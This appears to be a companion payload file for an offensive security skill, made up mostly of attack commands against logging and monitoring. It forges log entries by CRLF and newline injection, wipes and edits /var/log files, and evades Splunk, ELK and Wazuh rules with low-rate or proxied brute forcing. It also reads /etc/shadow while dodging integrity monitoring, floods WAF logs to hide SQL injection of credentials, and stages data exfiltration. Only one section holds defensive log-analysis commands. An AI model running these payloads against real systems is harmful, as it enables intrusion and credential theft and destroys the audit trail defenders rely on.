# Payloads: Logging & Monitoring Security

> This file is a companion to `SKILL.md`, containing the complete collection of attack payloads for log injection, evasion, SIEM bypass, audit tampering, WAF flooding, and more.

---

## 1. Log Injection Testing

### CRLF Injection -- Forging New Log Lines

```bash
# Forge an ERROR-level entry in logs
curl "http://target.com/api/log?event=normal%0d%0a[ERROR]%20Database%20connection%20failed"

# Forge a WARNING log to mislead analysts
curl "http://target.com/api/log?msg=login%0d%0a[WARNING]%20Possible%20intrusion%20from%2010.0.0.1"

# CRLF injection to forge HTTP request logs
curl "http://target.com/api/user?name=admin%0d%0a200%20OK%20-%20GET%20/admin/dashboard%20-%20200"
```

### Newline Injection -- Forging Fake Log Entries

```python
# Forge an ERROR log
malicious_input = "User login\n2026-04-26 ERROR: Admin password changed by unknown"

# Forge multiple log events
malicious_input = "search query\n2026-04-26 10:00:01 INFO: User admin logged in from 192.168.1.1\n2026-04-26 10:00:02 INFO: Session token abc123 created"

# Inject forged log via username field
username_payload = "testuser\n2026-04-26 03:14:00 [AUTH] Successful root login from 127.0.0.1"
```

### Control Character Injection -- Disrupting Log Parsing

```bash
# ANSI escape sequence injection to alter log display content
curl "http://target.com/search?q=test\x1b[31mFAKE+ALERT\x1b[0m"

# Backspace characters to overwrite log content
curl "http://target.com/api/log?data=authorized\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08unauthorized"

# NULL byte truncation of logs
curl "http://target.com/search?q=normal_query\x00MALICIOUS_HIDDEN_PART"

# Tab characters to confuse log field alignment
curl "http://target.com/api/event?user=admin\t\t\t\tsource=trusted-host"
```

### Log Sanitization Test Payload Set

```python
payloads = [
    # CRLF forging different log levels
    "test\r\nWARNING: Unauthorized access detected",
    "test\r\nERROR: System compromised - immediate action required",
    "test\r\nCRITICAL: Database breach confirmed",
    "test\r\nALERT: Intrusion detected from external IP",

    # Newline forging log lines
    "test\nERROR: System compromised",
    "test\n[INFO] Admin session started - token: stolen_token_123",

    # NULL byte truncation
    "test\x00IGNORE\x00REAL_DATA",
    "legitimate_action\x00\n[ERROR] Critical failure in auth module",

    # Unicode obfuscation
    "test\u2028FAKE_LOG_ENTRY",
    "test\u2029New log line injected",

    # Encoding bypass
    "test%0aWARNING:%20Suspicious%20activity",
    "test&#10;ERROR:&#32;Compromised",
    "test&#x0a;CRITICAL&#x3a;&#x20;Breach",
]
```

---

## 2. Log Evasion Techniques

### Log File Clearing and Overwriting

```bash
# Clear log file (requires root)
> /var/log/auth.log
# or
cat /dev/null > /var/log/auth.log

# Overwrite specific strings in a log file
sed -i 's/attacker_ip/legitimate_ip/g' /var/log/apache2/access.log

# Selectively delete log lines containing a specific IP
sed -i '/192\.168\.1\.100/d' /var/log/nginx/access.log
grep -v "attacker_ip" /var/log/apache2/access.log > /tmp/clean.log && mv /tmp/clean.log /var/log/apache2/access.log
```

### Log Rotation Exploitation

```bash
# Force log rotation to compress/archive current logs
logrotate -f /etc/logrotate.d/apache2

# Exploit rotated compressed files to reduce searchability
# After old logs are gzip compressed, SIEM may stop collecting them
ls -la /var/log/apache2/
# access.log.1.gz  access.log.2.gz  ...

# Delete rotated old log archives
rm -f /var/log/apache2/access.log.*.gz
```

### Noise Injection to Bury Attack Traces

```bash
# Large volume of normal requests to bury anomalous requests
for i in $(seq 1 10000); do
  curl -s "http://target.com/api/health" > /dev/null 2>&1 &
done

# Generate large volume of fake log events to dilute real attacks
for i in $(seq 1 5000); do
  curl -s "http://target.com/search?q=normal_query_$i" > /dev/null 2>&1 &
done

# Forge normal requests from many source IPs
for ip in $(seq 1 254); do
  curl -s -H "X-Forwarded-For: 10.0.0.$ip" "http://target.com/api/data" > /dev/null 2>&1 &
done
```

### Timestamp Forgery

```bash
# Modify system time to forge log timestamps (requires root)
date -s "2026-04-25 08:00:00"

# Forge request time via HTTP Header
curl -H "Date: Thu, 25 Apr 2026 08:00:00 GMT" "http://target.com/api/action"

# Hide attack time within timezone differences
curl -H "X-Request-Time: 2026-04-26T03:00:00+00:00" "http://target.com/attack"
```

---

## 3. SIEM Bypass Payloads

### Splunk Query Evasion

```bash
# Exploit field parsing differences to bypass Splunk detection
# If SIEM relies on user-agent field to detect malicious tools
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "http://target.com/admin"

# Construct request patterns that do not trigger rules (low frequency, long period)
# Attempt only one password per hour to bypass brute force detection within 5-minute windows
while true; do
  curl -s -X POST "http://target.com/login" -d "user=admin&pass=$(pwgen 8 1)" > /dev/null
  sleep 3600  # 1 request per hour
done
```

### ELK Rule Evasion

```bash
# Bypass User-Agent based detection rules
curl -A "" "http://target.com/api/endpoint"  # Empty UA

# Exploit log format inconsistency to bypass Elasticsearch parsing
# If SIEM expects JSON format but application outputs plain text
curl "http://target.com/api/log?event={\"action\":\"normal\",\"user\":\"admin'}"

# Distribute attack source IPs to bypass single-IP aggregation rules
# Use multiple proxies or Tor nodes
for i in $(seq 1 20); do
  curl --proxy "socks5://proxy_$i:9050" -s "http://target.com/login" -d "user=victim&pass=guess_$i" > /dev/null
done
```

### Wazuh Rule Evasion

```bash
# Exploit rule allowlist bypass
# If Wazuh is configured to ignore alerts from specific programs
/path/to/allowed_program --malicious-flag

# Modify monitored file and immediately restore (exploit polling interval)
cp /etc/shadow /tmp/shadow.bak
# ... read sensitive data ...
cp /tmp/shadow.bak /etc/shadow
# Restore within FIM detection interval
```

---

## 4. Monitoring Blind Spot Detection

### Log Coverage Assessment Checklist

```markdown
# Check if critical events are being logged
[ ] Login success / failure (including source IP, User-Agent, timestamp)
[ ] Access control failures (403 response + accessed resource path)
[ ] Input validation failures (SQL injection attempts, XSS payloads, path traversal)
[ ] Password change / reset operations (old/new password hashes not logged)
[ ] Permission changes (role assignments, group changes, API key generation)
[ ] Sensitive data access (bulk exports, unusual query patterns)
[ ] Administrator operations (configuration changes, user management, system settings)
[ ] Session management (Token generation, refresh, destruction)
```

### Blind Spot Detection Script

```bash
# Detect which endpoints do not log activity
for endpoint in /login /logout /admin /api/users /api/data /reset-password /change-email; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com$endpoint")
  echo "Endpoint: $endpoint - Status: $response"
  # Check if a corresponding log entry was generated
  # Compare log changes before and after the request
done

# Detect log level configuration
curl "http://target.com/api/debug" 2>&1
curl "http://target.com/api/trace" 2>&1
curl "http://target.com/api/error" 2>&1

# Check audit records for sensitive operations
curl -X POST "http://target.com/api/admin/users" -d '{"role":"admin"}' -H "Content-Type: application/json"
# Verify whether this operation was logged
```

### Monitoring Coverage Gap Testing

```bash
# Test whether database queries are logged
curl "http://target.com/api/users?limit=100000"  # Bulk data export

# Test whether API Key usage is logged
curl -H "Authorization: Bearer stolen_api_key" "http://target.com/api/sensitive"

# Test whether file downloads are logged
curl -O "http://target.com/api/export/all-users.csv"

# Test whether background tasks are monitored
curl -X POST "http://target.com/api/jobs" -d '{"command":"whoami"}' -H "Content-Type: application/json"

# Test error page information disclosure
curl "http://target.com/nonexistent_page_$(date +%s)"
curl "http://target.com/api/../../etc/passwd"
```

---

## 5. Audit Log Tampering

### Log Integrity Destruction

```bash
# Directly modify log files (requires root)
sed -i '/attacker_pattern/d' /var/log/auth.log
sed -i '/192\.168\.1\.100/d' /var/log/syslog

# Tamper with timestamps
# Change time from 03:00 to 10:00 in logs
sed -i 's/03:00:/10:00:/g' /var/log/apache2/access.log

# Overwrite entire log segment
dd if=/dev/zero of=/var/log/auth.log bs=1 seek=1000 count=500

# Modify log file metadata
touch -t 202604261000.00 /var/log/auth.log  # Forge mtime
```

### Correlation ID Tampering

```bash
# Tamper with correlation ID to break log correlation chains
# If log format is JSON
cat /var/log/app.log | jq '.correlation_id = "fake-id-$(date +%s)"' > /tmp/tampered.log
mv /tmp/tampered.log /var/log/app.log

# Replace session ID to break user tracking
sed -i 's/session_[a-f0-9]\+/session_tampered_00000000/g' /var/log/app.log
```

### Integrity Check Bypass

```bash
# If hash chain is used, try recalculating hashes
# Read original hash baseline
cat /secure/hash_baseline

# Regenerate hash after modifying logs
sha256sum /var/log/auth.log > /tmp/new_hash
# Attempt to replace baseline file (requires access to hash storage location)
# If hash is stored on the same system without WORM protection
cp /tmp/new_hash /secure/hash_baseline
```

---

## 6. Log Analysis Commands

### grep / awk / sed Log Analysis

```bash
# Count request frequency by IP to identify anomalous sources
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20

# Find all 4xx/5xx responses
grep -E "HTTP/[12]\" [45][0-9]{2}" /var/log/nginx/access.log

# Extract logs within a specific time window
awk '$4 >= "[26/Apr/2026:03:00:00" && $4 <= "[26/Apr/2026:04:00:00"' /var/log/nginx/access.log

# Find SQL injection attempts
grep -iE "(union.*select|or.*1=1|drop.*table|--|;--)" /var/log/nginx/access.log

# Find path traversal attempts
grep -E "\.\./" /var/log/nginx/access.log

# Find XSS attempts
grep -iE "(<script|javascript:|onerror=|onload=|alert\()" /var/log/nginx/access.log

# Count HTTP status code distribution
awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn

# Find large numbers of failed logins
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
```

### journalctl Analysis

```bash
# View all authentication-related logs
journalctl -u sshd --since "2026-04-25" --until "2026-04-26"

# Find sudo command execution records
journalctl -t sudo --since "today"

# Find service crash/restart events
journalctl -p err --since "2026-04-26"

# Export system logs for a specific time range
journalctl --since "2026-04-26 03:00:00" --until "2026-04-26 04:00:00" --output=json

# Find kernel-level security events
journalctl -k --since "2026-04-26"

# Real-time monitoring of authentication logs
journalctl -u sshd -f
```

### JSON Log Parsing (jq)

```bash
# Parse JSON format logs and extract errors
cat app.log | jq 'select(.level == "ERROR") | {timestamp, message, user}'

# Count operation frequency per user
cat app.log | jq '.user' | sort | uniq -c | sort -rn

# Find complete request chain for a specific correlation ID
cat app.log | jq 'select(.correlation_id == "abc-123-def")'

# Extract all administrator operations
cat app.log | jq 'select(.role == "admin") | {timestamp, action, resource, ip}'
```

---

## 7. WAF Evasion via Log Flooding

### Log Flooding Attacks

```bash
# High-frequency requests to overwhelm WAF log storage
# Goal: cause WAF log buffer overflow, discarding earlier records
for i in $(seq 1 100000); do
  curl -s "http://target.com/search?q=query_$i" > /dev/null 2>&1 &
  # Control concurrency to avoid triggering connection limits
  if [ $((i % 500)) -eq 0 ]; then
    wait
  fi
done

# Execute real attack simultaneously, using flooding as cover
curl -s "http://target.com/search?q=query_99999%27%20UNION%20SELECT%20password%20FROM%20users--" > /dev/null 2>&1 &

# Fill WAF logs with large volume of 404 requests
for i in $(seq 1 50000); do
  curl -s "http://target.com/nonexistent_page_$i" > /dev/null 2>&1 &
done
```

### WAF Rule Trigger Exhaustion

```bash
# Trigger large volume of low-level alerts to make security analysts ignore high-priority alerts
for i in $(seq 1 1000); do
  curl -s "http://target.com/search?q=<script>alert($i)</script>" > /dev/null 2>&1 &
done

# Send large volume of false positive payloads before real SQL injection
for payload in $(cat /usr/share/wordlists/waf-bypass.txt); do
  curl -s "http://target.com/api/data?q=$payload" > /dev/null 2>&1 &
done
# Real attack payload mixed in
curl -s "http://target.com/api/data?q=1'%20UNION%20SELECT%20*%20FROM%20credentials--" &
```

---

## 8. Time-Based Attack Detection Bypass

### Low-Frequency Attack to Bypass Time Window Detection

```bash
# Brute force bypass: only one attempt per time window
# Bypass "5 failures within 5 minutes" detection rule
while read password; do
  curl -s -X POST "http://target.com/login" -d "user=admin&pass=$password"
  sleep 320  # Wait longer than the detection window
done < password_list.txt

# Lateral movement bypass: probe from different IPs at different times
# Only one probe from each IP per day
ips=("10.0.1.1" "10.0.2.1" "10.0.3.1" "10.0.4.1")
for ip in "${ips[@]}"; do
  curl --interface "$ip" -s "http://target.com/admin" > /dev/null
  sleep 86400  # One IP per day
done
```

### Time Window Fragmentation Attack

```bash
# Spread a single attack across multiple short sessions
# Each session executes only a small portion of the attack
# Step 1: Information gathering (Day 1)
curl -s "http://target.com/api/users" > /tmp/users.txt

# Step 2: Credential attempt (Day 2)
curl -s -X POST "http://target.com/login" -d "user=admin&pass=found_password"

# Step 3: Privilege escalation (Day 3)
curl -s -X POST "http://target.com/api/admin/role" -d '{"user":"attacker","role":"admin"}'

# Step 4: Data exfiltration (Day 4)
curl -s "http://target.com/api/export/all-data" > /tmp/exfil.zip
```

### Exploiting Log Retention Policies

```bash
# Confirm log retention period
# Common configurations: 30 days, 90 days, 180 days
# Attackers hide early activity beyond the retention period

# Step 1: Execute initial intrusion on Day 1
# Step 2: Wait for logs to expire and rotate
# Step 3: Execute follow-up operations on Day 31 (assuming 30-day retention)
# Early intrusion logs have been deleted and cannot be correlated

# Exploit log rotation to accelerate log expiration
logrotate -f /etc/logrotate.d/syslog
# Repeat until target logs are compressed, archived, and eventually deleted
```
